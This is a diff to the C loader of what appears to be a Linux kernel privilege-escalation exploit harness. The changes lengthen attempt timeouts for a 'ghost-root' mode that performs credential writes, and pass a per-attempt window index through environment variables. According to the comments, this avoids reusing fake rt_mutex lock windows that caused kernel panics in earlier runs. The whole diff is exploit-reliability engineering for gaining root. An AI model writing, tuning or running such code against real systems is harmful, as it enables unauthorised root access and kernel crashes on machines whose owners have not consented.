@@ -115,8 +115,15 @@ __attribute__((constructor)) static void load(void) {
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
   int base_delay = env_int(
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
+  /* Ghost-root mode: discovery needs one ghost write per slot probe plus
+   * task-walk reads and the cred writes; each write is a fresh helper exec.
+   * The generic 90s default is too short (attempt 1 was killed mid-
+   * discovery in the last run), so default to 300s under GHOST_ROOT. */
+  int ghost_default_timeout = getenv("GHOST_ROOT")
+                                  ? 300
+                                  : DEFAULT_ATTEMPT_TIMEOUT_SEC;
   int attempt_timeout_sec = env_int(
-      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
+      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", ghost_default_timeout, 5, 900);
   int p0_attempt_timeout_sec = env_int(
       "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
       attempt_timeout_sec);
@@ -155,6 +162,23 @@ __attribute__((constructor)) static void load(void) {
       char delay[16];
       snprintf(delay, sizeof(delay), "%d", delay_usec);
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
+      /*
+       * The ghost flip child's fake-lock window must never be reused across
+       * attempts: each attempt is a fresh process, and a per-process window
+       * counter resets to wnd 0, reusing the window the previous attempt
+       * already walked (observed rt_mutex_adjust_prio_chain panic in the
+       * attempt-2 flip re-run, K2608130412).  Pass the persistent attempt
+       * index so every attempt's first flip starts on a fresh window pair.
+       */
+      char flip_base[16];
+      snprintf(flip_base, sizeof(flip_base), "%d", attempt - 1);
+      SYSCHK(setenv("GHOST_FLIP_WINDOW_BASE", flip_base, 1));
+      /* Same attempt-scoping for the ghost WRITE helper's fake-lock pair
+       * counter: it is a per-process static, and a fresh attempt process
+       * would restart at pair 0 and reuse the tree the previous attempt
+       * already walked (observed rt_mutex_adjust_prio_chain panic on the
+       * attempt-2 write helper, K2608130429). */
+      SYSCHK(setenv("GHOST_WRITE_WINDOW_BASE", flip_base, 1));
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
       const char *forced_offset = getenv("SLIDE_P0_OFFSET");
       if (forced_offset) {
@@ -190,7 +214,8 @@ __attribute__((constructor)) static void load(void) {
       time_t elapsed = now.tv_sec - started.tv_sec;
       int timeout_sec = attempt_timeout_sec;
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-      if (!getenv("SLIDE_P0_OFFSET") &&
+      if (!getenv("GHOST_ONLY") && !getenv("GHOST_ROOT") &&
+          !getenv("SLIDE_P0_OFFSET") &&
           !atomic_load(&app_p0_state->ready)) {
         timeout_sec = p0_attempt_timeout_sec;
       }
